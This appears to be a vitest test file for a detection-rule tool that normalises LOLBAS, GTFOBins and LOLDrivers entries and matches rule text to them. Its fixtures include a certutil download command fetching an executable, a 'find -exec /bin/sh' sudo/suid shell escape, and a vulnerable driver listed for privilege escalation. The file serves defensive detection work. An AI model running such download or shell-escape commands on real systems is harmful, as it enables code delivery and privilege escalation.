import { describe, expect, it } from 'vitest';
import { normalizeGtfobins, normalizeLolbas, normalizeLoldrivers } from '../src/lib/references';

// matchText/buildMatchers are exercised through this small helper
import * as refs from '../src/lib/references';

const lolbas = normalizeLolbas([
  {
    Name: 'Certutil.exe',
    Description: 'Windows binary used for handling certificates',
    Commands: [{ Command: 'certutil.exe -urlcache -f http://x a.exe', Category: 'Download', MitreID: 'T1105', Usecase: 'Download' }],
    Full_Path: [{ Path: 'C:\\Windows\\System32\\certutil.exe' }],
    Detection: [{ Sigma: 'https://example.org/sigma.yml' }],
    Resources: [{ Link: 'https://example.org' }],
  },
]);
const gtfobins = normalizeGtfobins({
  functions: { shell: { label: 'Shell', mitre: ['T1059'] } },
  executables: { find: { functions: { shell: [{ code: 'find . -exec /bin/sh \; -quit', contexts: { sudo: null, suid: null } }] } } },
});
const loldrivers = normalizeLoldrivers([
  {
    Id: 'ABC-1',
    Tags: ['RTCore64.sys'],
    Category: 'vulnerable driver',
    Verified: 'TRUE',
    MitreID: 'T1068',
    Commands: { Description: 'MSI Afterburner driver', Usecase: 'Elevate privileges' },
    KnownVulnerableSamples: [{ Filename: 'RTCore64.sys', SHA256: '01AA278B07B58DC46C84BD0B1B5C8E9EE4E62EA0BF7A695862444AF32E87F1FD' }],
  },
]);

describe('normalisers', () => {
  it('LOLBAS', () => {
    expect(lolbas[0]).toMatchObject({ key: 'certutil.exe', name: 'Certutil.exe' });
    expect(lolbas[0].data).toMatchObject({ type: 'Binary', categories: ['Download'], mitre: ['T1105'] });
  });
  it('GTFOBins', () => {
    expect(gtfobins[0].data).toMatchObject({ mitre: ['T1059'], contexts: ['sudo', 'suid'] });
  });
  it('LOLDrivers', () => {
    expect(loldrivers[0].data).toMatchObject({
      filenames: ['rtcore64.sys'],
      verified: true,
      hashes: ['01aa278b07b58dc46c84bd0b1b5c8e9ee4e62ea0bf7a695862444af32e87f1fd'],
    });
  });
  it('rejects the wrong file shape', () => {
    expect(() => normalizeLolbas({})).toThrow();
    expect(() => normalizeGtfobins([])).toThrow();
  });
});

describe('matching rules to references', () => {
  const entries = [
    ...lolbas.map((e) => ({ kind: 'lolbas', ...e })),
    ...gtfobins.map((e) => ({ kind: 'gtfobins', ...e })),
    ...loldrivers.map((e) => ({ kind: 'loldrivers', ...e })),
  ];
  const matchers = refs.__test.buildMatchers(entries);
  const match = (text: string) =>
    Object.fromEntries(Array.from(refs.matchText(matchers, text), ([k, v]) => [k, Array.from(v)]));

  it('matches Windows binaries by file name, not bare words', () => {
    expect(match('process.name : "certutil.exe" and process.args : "-urlcache"')).toEqual({ lolbas: ['certutil.exe'] });
    expect(match('Image|endswith: \\CertUtil.exe')).toEqual({ lolbas: ['certutil.exe'] });
    expect(match('certutil is often abused')).toEqual({});
    expect(match('notcertutil.exe.bak')).toEqual({});
  });

  it('matches Unix binaries only in path form or quoted in Linux rules', () => {
    expect(match('find the attacker')).toEqual({});
    expect(match('Image|endswith: /find')).toEqual({ gtfobins: ['find'] });
    expect(match('process.name == "find"')).toEqual({});
    expect(match('//Find the relevant network sessions')).toEqual({});
    expect(match('// find the relevant sessions')).toEqual({});
    expect(match('see https://example.org//find')).toEqual({});
    expect(match('host.os.type == "linux" and process.name == "find"')).toEqual({ gtfobins: ['find'] });
  });

  it('matches drivers by file name or hash', () => {
    expect(match('ImageLoaded|endswith: \\RTCore64.sys')).toEqual({ loldrivers: ['abc-1'] });
    expect(match('Hashes|contains: SHA256=01AA278B07B58DC46C84BD0B1B5C8E9EE4E62EA0BF7A695862444AF32E87F1FD')).toEqual({ loldrivers: ['abc-1'] });
  });
});
